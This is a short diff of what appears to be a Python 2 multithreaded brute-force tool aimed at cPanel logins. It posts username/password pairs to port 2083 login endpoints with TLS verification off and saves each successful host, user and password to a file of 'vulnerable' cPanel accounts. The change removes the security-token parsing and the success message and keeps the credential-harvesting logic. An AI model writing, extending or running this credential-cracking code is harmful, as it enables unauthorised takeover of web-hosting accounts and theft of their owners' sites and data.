@@ -54,12 +54,7 @@ class brute(threading.Thread):
 			r1 = s.post('https://'+url+':2083/login/?login_only=1', data=login_data, verify=False, timeout=18)
 			ttt.cancel()
 			json_login = r1.text
-											
-			sess_login = re.compile("security_token\":\"(.+)\"}")
-			sess_login = sess_login.search(json_login)
-			sess_login = sess_login.group(1)
-			print "\n[+++] Found cPanel : "+url+","+user+","+passwd
-			
+										
 			found.append(url)
 			
 			fisier_vuln_cpanel.write("https://"+url+":2083,"+user+","+passwd+"\n")
